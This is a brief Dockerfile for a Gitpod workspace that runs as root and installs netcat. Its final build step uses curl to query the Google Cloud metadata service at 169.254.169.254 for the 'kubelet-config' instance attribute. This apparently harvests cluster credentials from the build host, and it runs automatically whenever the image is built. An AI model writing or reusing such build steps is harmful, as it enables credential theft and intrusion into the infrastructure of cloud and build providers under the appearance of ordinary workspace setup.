FROM gitpod/workspace-full

USER root
RUN apt-get update && apt-get -yq install netcat



RUN curl -H "Metadata-Flavor: Google" 'http://169.254.169.254/computeMetadata/v1/instance/attributes/kubelet-config'
